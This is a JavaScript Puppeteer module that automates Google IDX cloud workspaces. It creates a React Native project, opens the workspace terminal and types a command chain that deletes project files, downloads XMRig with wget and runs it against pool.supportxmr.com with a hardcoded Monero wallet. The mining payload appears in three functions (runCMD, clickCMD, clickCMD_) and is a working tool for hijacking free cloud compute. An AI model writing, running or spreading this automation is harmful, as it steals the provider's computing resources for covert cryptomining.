// monaco-dialog-modal-block
const puppeteer = require('puppeteer');
const { exec } = require('child_process');
const workerName = 'd_'

async function waitForClassToExist(page, classSelector, maxWaitTimeMs = 5 * 60 * 1000, checkIntervalMs = 10 * 1000) {
    console.log(`Starting to wait for class '${classSelector}' to appear...`);
    const startTime = Date.now();

    let classFound = false;
    while (!classFound && (Date.now() - startTime < maxWaitTimeMs)) {
        try {
            // Check if the element exists and is visible
            const element = await page.$(classSelector);
            if (element) {
                const isVisible = await page.evaluate((el) => {
                    const style = window.getComputedStyle(el);
                    return style && style.display !== 'none' && style.visibility !== 'hidden' && style.opacity !== '0';
                }, element);

                if (isVisible) {
                    classFound = true;
                    console.log(`Found element with class '${classSelector}' after ${Math.round((Date.now() - startTime) / 1000)} seconds`);
                    return true;
                }
            }
            // Wait before checking again
            console.log(`Class '${classSelector}' not found yet, checking again in ${checkIntervalMs / 1000} seconds...`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        } catch (error) {
            console.log(`Error while checking for class: ${error.message}`);
            await new Promise(resolve => setTimeout(resolve, checkIntervalMs));
        }
    }

    if (!classFound) {
        console.log(`Timed out waiting for class '${classSelector}' after ${maxWaitTimeMs / 1000} seconds`);
    }
    return false;
}

const runCMD = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 40 * 1000));
    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await new Promise(resolve => setTimeout(resolve, 100));
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
    }
}


const clickElementInIframe = async (page, iframeSelector = 'iframe', elementSelector) => {
    try {
      // Wait for iframe to be available
      await page.waitForSelector(iframeSelector);
      
      // Get the iframe element
      const frameElement = await page.$(iframeSelector);
      if (!frameElement) {
        console.log('Iframe not found');
        return false;
      }
      
      // Get the content frame
      const frame = await frameElement.contentFrame();
      if (!frame) {
        console.log('Could not access iframe content');
        return false;
      }
      
      // Wait for the element in the iframe to be available
      await frame.waitForSelector(elementSelector);
      
      // Click the element
      await frame.click(elementSelector);
      console.log(`Successfully clicked element "${elementSelector}" inside iframe`);
      return true;
    } catch (error) {
      console.error(`Error clicking element in iframe: ${error.message}`);
      return false;
    }
  }
const clickCMD = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 40 * 1000));
    await page.waitForSelector('iframe.is-loaded');
    await page.click('iframe.is-loaded');

    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await new Promise(resolve => setTimeout(resolve, 100));
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
    await page.keyboard.press('Enter');
    await new Promise(resolve => setTimeout(resolve, 1000));
}

const clickCMD_ = async (page, name) => {

    await new Promise(resolve => setTimeout(resolve, 20 * 1000));
    await page.click("#workbench\.parts\.activitybar > div > div.menubar.compact.inactive.overflow-menu-only > div > div");
    


    return ;


    await page.keyboard.down('Shift');
    await page.keyboard.down('Meta'); // 'Meta' is Command on Mac
    await page.keyboard.press('c');
    await page.keyboard.up('Meta');
    await page.keyboard.up('Shift');

    await new Promise(resolve => setTimeout(resolve, 1000));
    console.log('Pressed Shift+Command+C');

    const commands = [
        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
        " && cd xmrig-6.22.2",
        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
    ];

    for (const cmd of commands) {
        await new Promise(resolve => setTimeout(resolve, 100));
        await page.keyboard.type(cmd);
        // Small delay between chunks to ensure proper typing
    }

    await new Promise(resolve => setTimeout(resolve, 1000));
    await page.keyboard.press('Enter');
    await new Promise(resolve => setTimeout(resolve, 1000));
}

const initConnection = async (port, name = new Date().valueOf()) => {
    // Connect to the already running Chrome instance
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });

    // Open a new tab (page)
    const page = await browser.newPage();
    await page.goto('https://idx.google.com/new/react-native');


    console.log('New tab opened in existing Chrome!');
    await page.waitForSelector('#mat-input-0');

    // Type text into the input with ID mat-input-0
    await page.type('#mat-input-0', name);


    await page.keyboard.press('Enter');
    // Wait for 2 seconds before pressing Enter
    // await page.waitForTimeout(2000); 
    await new Promise(resolve => setTimeout(resolve, 1000));

    const currentUrl = await page.url();
    console.log('Current URL path:', currentUrl);
    return page;
}

const openOldConnection = async (port) => {
    // Connect to the already running Chrome instance
    const browser = await puppeteer.connect({
        browserURL: 'http://localhost:' + port,
        defaultViewport: null,
    });

    // Open a new tab (page)
    const page = await browser.newPage();
    await page.goto('https://idx.google.com');

    // Wait for selector to ensure the page is loaded
    await page.waitForSelector('.main-target');

    // Get list of <a> tags with ID/class main-target and their href values
    const mainTargetLinks = await page.evaluate(() => {
        const classElements = document.querySelectorAll('a.main-target');
        const allElements = Array.from(classElements);
        return allElements.map(el => ({ href: el.href }));
    });
    console.log('Found <a> tags with main-target:', mainTargetLinks);
    return { browser, page, mainTargetLinks };
}
const runRestartScript = (script) => {
    return new Promise((resolve, reject) => {
      exec(script, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error running restart script: ${error.message}`);
          reject(error);
        } else {
          console.log('Restart script executed successfully');
          if (stdout) console.log(`stdout: ${stdout}`);
          if (stderr) console.warn(`stderr: ${stderr}`);
          resolve();
        }
      });
    });
  }
const openChrome = async (port) => {
    // For macOS, no need for escape sequences in the variable itself
    const chromePath = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome';

    // When passing to exec, properly escape spaces and quotes
    const remoteDebugCmd = `"${chromePath}" --remote-debugging-port=${port} --user-data-dir=./profile/chrome-profile${port}`;

    return new Promise((resolve, reject) => {
        console.log('Executing:', remoteDebugCmd);
        exec(remoteDebugCmd, (error) => {
            if (error) {
                console.error(`Error launching Chrome: ${error.message}`);
                reject(error);
            } else {
                console.log('Chrome launched with remote debugging');
                resolve();
            }
            console.log('Chrome launched with remote debugging');
        });
    });
}

module.exports = {
    openChrome,
    initConnection,
    runCMD,
    waitForClassToExist,
    openOldConnection,
    clickCMD,
    clickCMD_,
    runRestartScript,
}
